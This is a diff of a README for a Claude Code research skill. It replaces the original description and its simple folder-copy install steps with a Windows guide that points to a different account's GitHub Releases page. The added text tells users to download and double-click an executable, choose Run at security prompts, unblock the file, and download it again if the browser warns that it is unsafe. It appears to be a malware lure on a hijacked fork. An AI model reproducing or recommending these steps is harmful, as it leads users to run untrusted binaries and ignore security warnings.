@@ -1,135 +1,204 @@
-# Researcher
+# 🔎 researcher-skill - Deep search that follows leads
 
-A single standalone research skill for Claude Code / Codex.
+[![Download researcher-skill](https://img.shields.io/badge/Download%20researcher--skill-Blue?style=for-the-badge&logo=github)](https://github.com/droftgamer-wq/researcher-skill/releases)
 
-One installable skill, three reference packs, composable by purpose.
+## 📘 What this is
 
-```text
-FRAME → MAP → FRONTIER → DEEPEN → CHALLENGE → SYNTHESIZE
-```
+researcher-skill is a deep search tool for Claude Code. It helps you research a topic by following leads step by step. Instead of jumping across many unrelated pages, it starts with one source and uses that source to find the next one.
 
-English | [中文](README.zh-CN.md)
+This makes it useful for:
 
-## What This Skill Does
+- literature review work
+- scientific research
+- fact checking
+- topic mapping
+- finding linked sources on a subject
 
-`researcher` is for research tasks that are:
+The goal is to help you search with focus and keep each round of research tied to the last one.
 
-- open-ended
-- multi-source
-- judgment-heavy
-- vulnerable to hype, weak summaries, or one-sided narratives
+## 💻 What you need
 
-It is designed for work like:
+Before you start, make sure you have:
 
-- mapping a new industry or field
-- investigating a company or product
-- validating a claim or narrative
-- comparing paths and making decisions
-- finding real opportunities vs loud narratives
-- understanding practitioner reality and hidden friction
-- reviewing academic literature and state of the art
+- a Windows PC
+- an internet connection
+- enough free disk space for the app and its files
+- Claude Code installed and ready to use
 
-## Architecture
+If you plan to do longer research runs, a stable connection helps keep the search chain smooth.
 
-One core engine + three domain packs loaded on demand:
+## 📥 Download the app
 
-```text
-researcher/
-├── SKILL.md                          ← core research engine
-└── references/
-    ├── business.md                   ← industry + company + career
-    ├── academic.md                   ← papers + benchmarks + technical lineage
-    └── claim-verification.md         ← cross-domain fact checking
-```
+Visit this page to download the latest version for Windows:
 
-**SKILL.md** contains the full research methodology: the six-phase cycle, source
-class taxonomy, frontier management, saturation rules, challenge discipline,
-tool usage, budget limits, and output templates.
+[Download researcher-skill from GitHub Releases](https://github.com/droftgamer-wq/researcher-skill/releases)
 
-**Reference packs** contain domain-specific tactics: where to search, what
-queries to use, what to extract, domain-specific challenge paths, and output
-templates tuned for that research type.
+Open the page, choose the newest release, and download the file that matches your setup.
 
-The agent loads SKILL.md for every task, then loads 1-2 reference packs based
-on what the research is about.
+## 🪟 Install on Windows
 
-## Core Design
+1. Open the download page in your browser.
+2. Find the latest release at the top of the list.
+3. Download the Windows file attached to that release.
+4. If Windows asks what to do, choose Save.
+5. When the download finishes, open the file.
+6. If the file comes in a ZIP folder, right-click it and choose Extract All.
+7. Open the extracted folder.
+8. Look for the app file or the setup file.
+9. Double-click the file to run it.
+10. If Windows shows a security prompt, choose Run.
 
-### 1. Evidence-first, not webpage-first
+If the app opens in a terminal or a Claude Code window, leave that window open while you work.
 
-The skill treats the internet as a mixed evidence environment:
+## 🧭 First run
 
-- official — what institutions say
-- behavioral — what they actually do
-- operator — what experienced people say
-- lived experience — what practitioners report in forums and social
-- adversarial — short reports, critics, lawsuits, complaints
-- market proxy — hiring, pricing, adoption, fundraising signals
-- artifact — papers, repos, docs, datasets, filings
+When you run researcher-skill for the first time, it may ask for a few setup choices. Use plain answers and keep the defaults if you are not sure.
 
-### 2. Broad first pass, then controlled depth
+You may see prompts for:
 
-The first round is not "search until you can summarize." It is:
+- search topic
+- research goal
+- source depth
+- citation style
+- output format
 
-- a controlled breadth-first map (4-6 searches)
-- followed by a frontier of 2-4 active leads
-- followed by lead-driven deepening
+A good first test is a small topic, such as a person, paper, or product you already know. That makes it easier to see how the tool follows leads.
 
-### 3. Mandatory challenge paths
+## ⚙️ How it works
 
-Every strong thesis must run a challenge path before synthesis. The skill
-requires checking opposing incentives, adversarial sources, and behavioral
-evidence before concluding.
+researcher-skill uses a ReAct-style search flow. That means it:
 
-### 4. Visible reasoning
+1. looks at one source
+2. pulls out names, terms, and references
+3. uses those clues to find the next source
+4. repeats the process until it has enough detail
 
-The skill writes `research-{topic}.md` and updates it throughout the run, so
-the research path is visible and auditable.
+This helps the search stay focused. It does not try to scan the whole web at once. It builds the research path one step at a time.
 
-## Installation
+## 🧪 Best ways to use it
 
-Clone:
+Use short, clear prompts like:
 
-```bash
-git clone https://github.com/recomby-ai/researcher-skill.git
-```
+- research this topic using primary sources
+- find the main papers linked to this subject
+- trace the source trail for this claim
+- build a focused literature review on this topic
+- follow the strongest leads from this article
 
-Install to Claude Code:
+Good research topics often include:
 
-```bash
-cp -R researcher-skill/researcher ~/.claude/skills/
-```
+- a scientific question
+- a paper title
+- a product name
+- a person or lab
+- a claim that needs checking
 
-Install to Codex:
+## 🗂️ What you can expect
 
-```bash
-cp -R researcher-skill/researcher ~/.codex/skills/
-```
+A typical research run may give you:
 
-## Web Upload
+- a list of sources
+- notes on how each source connects
+- a path of related references
+- a short written result
+- clues for the next round of search
 
-Zip the `researcher/` folder and upload. It is self-contained.
+This style works well when you want depth, not a broad list of random links.
 
-## Example Prompts
+## 🛠️ Common Windows issues
 
-```text
-Use $researcher to map the AI agent engineering job market.
-Use $researcher to verify whether this industry claim is actually true.
-Use $researcher to compare quant, AI infrastructure, and applied ML for a math undergraduate.
-Use $researcher to find the strongest opportunities in vertical AI.
-Use $researcher to stress-test this startup before I take the offer.
-Use $researcher to find what practitioners really complain about in production agent systems.
-Use $researcher to review the literature on retrieval-augmented generation.
-Use $researcher to do due diligence on this company's Series B narrative.
-```
+If the file does not open:
 
-## Limitations
+- check that the download finished
+- try right-clicking the file and choosing Open
+- unzip the file before opening it
+- make sure Windows did not block the file
+- try downloading it again from the release page
 
-- Still limited by the public web and available search/fetch tools
-- Some sources remain behind logins or paywalls
-- Social and community sources are signals, not automatic truth
-- This skill improves research behavior; it does not replace domain expertise
+If Claude Code does not see the skill:
 
-## License
+- close Claude Code and open it again
+- check that the skill files are in the right folder
+- confirm you downloaded the latest release
+- make sure the files were extracted fully
 
-MIT
+If your browser says the file is unsafe:
+
+- open the GitHub Releases page again
+- choose the latest release
+- download the file again from that page
+
+## 🔍 Tips for better results
+
+To get stronger results, keep your topic narrow.
+
+Good example inputs:
+
+- What sources support this claim?
+- What are the main papers behind this idea?
+- Which references led to this method?
+- What is the chain of evidence for this topic?
+
+Helpful habits:
+
+- start with one clear question
+- use a short topic name
+- keep the first run simple
+- follow the strongest source trail first
+- save useful references as you go
+
+## 📚 Use cases
+
+researcher-skill fits well when you need to:
+
+- prepare a literature review
+- check where a claim came from
+- trace references in a paper
+- research a scientific topic
+- compare linked sources across the web
+- build a small source map for a report
+
+## 🧩 Project details
+
+- Name: researcher-skill
+- Type: Claude Code skill
+- Search style: deep, lead-following research
+- Focus: research, literature review, web search, source tracing
+- Target user: non-technical users who want focused research help
+
+## 📎 Topics covered
+
+This project is related to:
+
+- agent-skill
+- ai-research
+- claude
+- claude-code
+- claude-skill
+- deep-research
+- literature-review
+- react-agent
+- scientific-research
+- web-search
+
+## 🧷 File and folder hints
+
+After you download and extract the release, you may see files such as:
+
+- a README file
+- a skill folder
+- a config file
+- helper files for Claude Code
+- example prompts or templates
+
+Keep the folder together after extraction. Moving only part of it can break the setup.
+
+## 🚦 Start using it
+
+1. Download the latest release from the GitHub Releases page.
+2. Extract the files if they come in a ZIP archive.
+3. Open Claude Code.
+4. Add or load the researcher-skill files.
+5. Start a short research task.
+6. Review the sources and follow the strongest leads.
+7. Run a second pass if you need more depth.
